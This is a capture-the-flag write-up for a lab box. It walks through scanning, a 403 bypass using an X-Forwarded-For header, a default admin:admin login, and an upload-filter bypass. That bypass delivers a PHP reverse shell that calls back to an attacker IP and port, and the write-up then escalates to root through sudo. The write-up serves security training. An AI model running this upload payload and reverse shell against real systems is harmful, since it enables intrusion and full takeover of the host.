# **Web2Shell - ThunderCipher**

*Target Ip. Address : 192.168.5.38*

So, let's begin with the nmap scan.

```bash
kali@kali:nmap -sV -sC 192.168.5.38
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-09 07:54 +0545
Nmap scan report for 192.168.5.38
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d8:e0:99:8c:76:f1:86:a3:ce:09:c8:19:a4:1d:c7:e1 (DSA)
|   2048 82:b0:20:bc:04:ea:3f:c2:cf:73:c3:d4:fa:b5:4b:47 (RSA)
|   256 03:4d:b0:70:4d:cf:5a:4a:87:c3:a5:ee:84:cc:aa:cc (ECDSA)
|_  256 64:cd:d0:af:6e:0d:20:13:01:96:3b:8d:16:3a:d6:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.48 seconds
```

So, we have 2 open ports. Port 22 (ssh) and Port 80 (http).

Let's see what we have in website at port 80.

<img width="1261" height="672" alt="image" src="https://github.com/user-attachments/assets/2a4d9b8e-d2cb-4d5e-96e2-29f0f748e5fa" />

Nothing on this page. Let's try some enumeration.

```bash
kali@kali:gobuster dir -u http://192.168.5.38/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.38/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 296]
.htpasswd            (Status: 403) [Size: 296]
server-status        (Status: 403) [Size: 300]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```

What!!! We get nothing. Let's try with another big wordlist.

```bash
kali@kali:gobuster dir -u http://192.168.5.38/ -w /usr/share/wordlists/SecLists/Discovery/DNS/FUZZSUBS_CYFARE_1.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.38/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/DNS/FUZZSUBS_CYFARE_1.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 15667 / 5605156 (0.28%)[ERROR] error on word kutahya: timeout occurred during the request
3010850A0000F0FD0F00323137443744324536313634333833380044454C4C58540000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000007014C61757261000000000000000000000000000000000000000000000000000000000000000000000000 (Status: 403) [Size: 555]
Dq0x2MZoiodO-kOKn-ndGIxGVyPZ7xv7O3P6Mvd7RqORkIKLThMucpqOosG2wgcDeb5ujt1H89lEZyOsLhsNgzg46lLHanKOmyYZO5kxpJzTMbfBmtg8gwpHk2TV9Dn1RFEXtEeH7P-ZTWcu6HGeTYajj23wzGlVRtMht6tAajabg7mSoQz9R9MfXL7zcNBrRqVCgQTrX4Q6hjcU6re6zyIobzPzjUHuPZC-Y42DMeesoG2WV44aZagus6pisxMdbfWBDfFyNhhj5OGD5zsAzGusD3rwzGeUgdDlbYc7a7Se4-wNrMo4zhU5NPzy2p4AAbdj2LRJhjzSzMaTOdbjTpg2Z2mefix56t6pIysBATo4oeRdfNvzd (Status: 403) [Size: 660]
index.php            (Status: 200) [Size: 791]
server-status        (Status: 403) [Size: 300]
.htpasswd            (Status: 403) [Size: 296]
.htaccess            (Status: 403) [Size: 296]
adminstration        (Status: 301) [Size: 320] [--> http://192.168.5.38/adminstration/]
Progress: 85170 / 5605155 (1.52%)
```

I don't know if the spelling of administration was mistake or intentional. But anyway, we found it.
So, let's see what do we have here.

<img width="1254" height="452" alt="image" src="https://github.com/user-attachments/assets/4ab4aeb3-d57b-4531-b78d-84c0d0c57b5f" />

So, we have a basic forbidden page. Let's try some basic 403 bypass using bypass-403 tool.

```bash
kali@kali:./bypass-403.sh http://192.168.5.38/adminstration/
 ____                                  _  _    ___ _____ 
| __ ) _   _ _ __   __ _ ___ ___      | || |  / _ \___ / 
|  _ \| | | | '_ \ / _` / __/ __|_____| || |_| | | ||_ \ 
| |_) | |_| | |_) | (_| \__ \__ \_____|__   _| |_| |__) |
|____/ \__, | .__/ \__,_|___/___/        |_|  \___/____/ 
       |___/|_|                                          
                                               By Iam_J0ker
./bypass-403.sh https://example.com path
 
403,75  --> http://192.168.5.38/adminstration//
403,75  --> http://192.168.5.38/adminstration//%2e/
403,75  --> http://192.168.5.38/adminstration///.
403,75  --> http://192.168.5.38/adminstration/////
403,75  --> http://192.168.5.38/adminstration//.//./
403,75  --> http://192.168.5.38/adminstration// -H X-Original-URL: 
403,75  --> http://192.168.5.38/adminstration// -H X-Custom-IP-Authorization: 127.0.0.1
200,926  --> http://192.168.5.38/adminstration// -H X-Forwarded-For: http://127.0.0.1
200,926  --> http://192.168.5.38/adminstration// -H X-Forwarded-For: 127.0.0.1:80
403,75  --> http://192.168.5.38/adminstration/ -H X-rewrite-url: 
404,292  --> http://192.168.5.38/adminstration//%20
404,292  --> http://192.168.5.38/adminstration//%09
403,75  --> http://192.168.5.38/adminstration//?
403,307  --> http://192.168.5.38/adminstration//.html
403,75  --> http://192.168.5.38/adminstration///?anything
403,75  --> http://192.168.5.38/adminstration//#
403,75  --> http://192.168.5.38/adminstration// -H Content-Length:0 -X POST
404,293  --> http://192.168.5.38/adminstration///*
403,306  --> http://192.168.5.38/adminstration//.php
404,296  --> http://192.168.5.38/adminstration//.json
405,316  --> http://192.168.5.38/adminstration//  -X TRACE
403,75  --> http://192.168.5.38/adminstration// -H X-Host: 127.0.0.1
404,295  --> http://192.168.5.38/adminstration//..;/
000,0  --> http://192.168.5.38/adminstration//;/
405,316  --> http://192.168.5.38/adminstration// -X TRACE
403,75  --> http://192.168.5.38/adminstration// -H X-Forwarded-Host: 127.0.0.1
Way back machine:
{
  "available": null,
  "url": null
}
```

We get a hit. 

```bypass
200,926  --> http://192.168.5.38/adminstration// -H X-Forwarded-For: http://127.0.0.1
200,926  --> http://192.168.5.38/adminstration// -H X-Forwarded-For: 127.0.0.1:80
```

We can basically add any one of the headers to bypass 403.
Let's intercept the request, add the header and forward the request.

```request
GET /adminstration/ HTTP/1.1
Host: 192.168.5.38
X-Forwarded-For: http://127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=u2mp7uciqq1nlvska87ukjnnd7
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Forward the request, and let's see if that works.

<img width="1256" height="580" alt="image" src="https://github.com/user-attachments/assets/c7044f0d-a887-416b-ab29-1e4042c23b32" />

We have ourselves a simple login page. Let's try some simple credentials.

Never had I ever though, such simple credentials admin:admin would work.

<img width="1253" height="608" alt="image" src="https://github.com/user-attachments/assets/df27cab8-55f8-4b66-9015-45a4384be3b7" />

We see that we can upload files. But we cannot upload a php file, let's see if we can bypass that.

It seems we can upload a png file.
Let's start a listener at attacker machine.

```bash
kali@kali:nc -nlvp 4444
listening on [any] 4444 ...
```

Rename your reeverse shell (eg: rev.php) to rev.php.png.

Upload it and intercept the request.

```request
POST /adminstration/upload/ HTTP/1.1
Host: 192.168.5.38
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary17b0b48f6cab57b8bcb877d47bc83f72
Content-Length: 5821
Origin: http://192.168.5.38
Connection: keep-alive
Referer: http://192.168.5.38/adminstration/upload/
Cookie: PHPSESSID=u2mp7uciqq1nlvska87ukjnnd7
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary17b0b48f6cab57b8bcb877d47bc83f72
Content-Disposition: form-data; name="document"; filename="rev.php"
Content-Type: image/png

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.5.17';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
.
.
.
.
.
// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

------geckoformboundary17b0b48f6cab57b8bcb877d47bc83f72
Content-Disposition: form-data; name="submit"

Send
------geckoformboundary17b0b48f6cab57b8bcb877d47bc83f72--
```

In the request revert the change of rev.php.png to rev.php and forward the request.

<img width="1256" height="552" alt="image" src="https://github.com/user-attachments/assets/4ca6d25c-5447-451c-9a19-28e64e9a0873" />

Our file was successfully uploaded. Run the file and receive the shell on listener.

```bash
kali@kali:nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.5.17] from (UNKNOWN) [192.168.5.38] 54424
Linux web2shell 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686 athlon i686 GNU/Linux
 05:52:35 up 46 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

We got a shell. Stabilize the shell.

```bash
$ python3 -c 'import pty; pty.spawn ("/bin/bash")'
www-data@web2shell:/$ 
```

At home directory, we find password for user hacker.

```bash
www-data@web2shell:/home$ cat ssh.key
cat ssh.key
hacker:h4...m3
```

Let's switch to user hacker.

```bash
www-data@web2shell:/home$ su hacker
su hacker
Password: h4...m3

hacker@web2shell:/home$
```
Read the user flag at hacker's home directory.

```bash
hacker@web2shell:~$ cat user.txt
cat user.txt
ThunderCipher{fi.....A3}
```

See if we have any sudo permissions. 

```bash
hacker@web2shell:/home$ sudo -l
sudo -l
[sudo] password for hacker: h4...m3

Matching Defaults entries for hacker on web2shell:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hacker may run the following commands on web2shell:
    (ALL : ALL) ALL
```

What!!! We have all permissions. Let's quickly switch to root.

```bash
hacker@web2shell:/home$ sudo su
sudo su
root@web2shell:/home# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Read the final flag at root directory, and wrap up this easy but somewhat odd challenge.

```bash
root@web2shell:~# cat root.txt
cat root.txt
ThunderCipher{ss...Q2}
```
